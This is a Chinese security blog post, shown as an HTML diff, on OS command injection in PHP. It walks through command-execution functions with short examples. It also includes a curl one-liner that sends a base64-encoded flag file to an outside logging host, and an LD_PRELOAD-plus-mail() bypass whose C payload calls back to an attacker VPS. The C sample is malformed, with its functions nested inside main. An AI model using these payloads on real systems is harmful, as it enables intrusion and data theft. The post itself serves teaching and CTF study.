@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>命令注入 ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">命令注入</p>
+            <br>
+            
+            <p>Monday, July 29th 2019, 5:36 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
+<p>在Web应用中，有时候会用到一些命令执行的函数，如<code>php</code>中<code>system</code>、<code>exec</code>、<code>shell_exec</code>等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。</p>
+<h2 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h2><ul>
+<li>system()</li>
+<li>passthru()</li>
+<li>exec()</li>
+<li>pcntl_exec()</li>
+<li>shell_exec()</li>
+<li>popen()</li>
+<li>proc_open()</li>
+<li>`反引号</li>
+<li>ob_start()</li>
+<li>mail函数+LD_PRELOAD执行系统命令</li>
+</ul>
+<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>函数定义：</p>
+<pre><code>string system ( string $command [, int &amp;$return_var ] )
+
+</code></pre><p><code>command</code>是要执行的命令。<code>return_var</code>，如果提供 <code>return_var</code> 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
+<pre><code>&lt;?php
+    system(&quot;whoami&quot;);
+?&gt;
+</code></pre><p>会看到运行了shell命令，并打印回显到页面上。</p>
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>函数定义：</p>
+<pre><code>void passthru ( string $command [, int &amp;$return_var ] )
+
+</code></pre><p>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</p>
+<pre><code>&lt;?php
+    passthru(&quot;whoami&quot;);
+?&gt;
+</code></pre><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>函数定义：</p>
+<pre><code>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )
+
+</code></pre><p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p>
+<pre><code>&lt;?php
+    echo exec(&quot;whoami&quot;);
+?&gt;
+</code></pre><p>该函数不能直接回显，需要手动输出。。。</p>
+<p>可以利用ceye：</p>
+<pre><code>data=$(cat flag.php | base64);curl http://36rdia.ceye.io/？data=$data;
+</code></pre><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><p>函数定义：<br>pcntl_exec — 在当前进程空间执行指定程序</p>
+<pre><code>void pcntl_exec ( string $path [, array $args [, array $envs ]] )
+
+</code></pre><ul>
+<li><code>path</code>必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本</li>
+<li><code>args</code>是一个要传递给程序的参数的字符串数组。</li>
+<li><code>envs</code>是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。</li>
+</ul>
+<pre><code>➜  html php -r &quot;pcntl_exec( &#39;/bin/ls&#39; , array(&#39;./&#39;));&quot;
+
+输出的结果：
+1.txt 2.txt web
+
+</code></pre><p>让我们来看看<code>/bin</code>下又什么文件：</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e8nsts.png" alt=""></p>
+<p>发现我们可以通过这个函数来执行<code>cat</code>，<code>echo</code>，<code>chmod</code>, <code>rm</code> , <code>touch</code>等命令</p>
+<p>例如：</p>
+<pre><code>➜  html php -r &quot;pcntl_exec( &#39;/bin/echo&#39; , array(&#39;`ls`&#39;));&quot;
+1.txt
+2.txt
+web
+
+</code></pre><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>函数定义：</p>
+<pre><code>string shell_exec ( string $cmd )
+
+</code></pre><p>cmd是要执行的命令。</p>
+<pre><code>➜  html php -r &quot;echo shell_exec(&#39;whoami&#39;);&quot;
+root
+➜  html
+
+</code></pre><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p>函数定义：</p>
+<pre><code>resource popen ( string $command , string $mode )
+
+</code></pre><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。</p>
+<pre><code>➜  html php -r &quot;popen(&#39;/bin/echo \&quot;123\&quot; &gt;&gt; 1.txt&#39;,&#39;w&#39;);&quot;
+➜  html cat 1.txt
+123
+
+</code></pre><p>能够执行的命令</p>
+<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>函数定义：</p>
+<pre><code>resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )
+
+</code></pre><p>cmd是要执行的命令，其余见<a href="http://php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">文档</a></p>
+<h3 id="反引号"><a href="#反引号" class="headerlink" title="`反引号"></a>`反引号</h3><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p>
+<pre><code>➜  html php -r &quot;echo @`whoami`;&quot;
+root#    
+</code></pre><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><p>官方文档</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3bQ6U.png" alt=""></p>
+<p><code>ob_start($a)</code>参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回调函数处理，回调函数内不能再调用<code>ob_start()</code>.</p>
+<p>测试：</p>
+<pre><code>&lt;?php
+$foobar = &#39;system&#39;;
+ob_start($foobar);
+echo &#39;whoami&#39;;
+ob_end_flush();
+?&gt;
+</code></pre><p>可以成功执行<code>whoami</code>的命令。但是<code>php7</code>测试未成功<br>这里注意，如果我这样使用</p>
+<p> echo ‘whoami’;</p>
+<p>whoami</p>
+<p>是没有任何作用的</p>
+<p>因为这里的<code>$foobar</code>被作为输出的回调函数</p>
+<p>而我们输入的<code>whoami</code>在缓冲区</p>
+<p>经过<code>ob_end_flush()</code>输出缓冲区后，可以得到</p>
+<p><code>system(&#39;whoami&#39;)</code></p>
+<p>这样的操作，所以成功执行了命令</p>
+<h3 id="mail函数-LD-PRELOAD执行系统命令"><a href="#mail函数-LD-PRELOAD执行系统命令" class="headerlink" title="mail函数+LD_PRELOAD执行系统命令"></a>mail函数+LD_PRELOAD执行系统命令</h3><p>思路：<br>LD_PRELOAD可以用来设置程序运行前优先加载的动态链接库，php函数mail在实现的过程中会调用标准库函数，通过上传一个编译好的动态链接程序(这个程序中重新定义了一个mail函数会调用的库函数，并且重新定义的库函数中包含执行系统命令的代码。)，再通过LD_PRELOAD来设置优先加载我们的上传的动态链接程序，从而实现命令执行。</p>
+<p>a.c</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt; 
+int main(){
+
+void payload() {
+    system(&quot;curl http://vps_IP:4123/?a=`whoami`&quot;);
+    } 
+int geteuid() {
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+    }
+}
+</code></pre><p>编译</p>
+<pre><code>gcc -c -fPIC a.c -o a 
+gcc -shared a -o a.so
+
+</code></pre><p>mail.php</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=/var/www/html/a.so&quot;);
+mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;
+
+</code></pre><p>监听vps的4123端口，访问mail.php。</p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;web常见漏洞</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
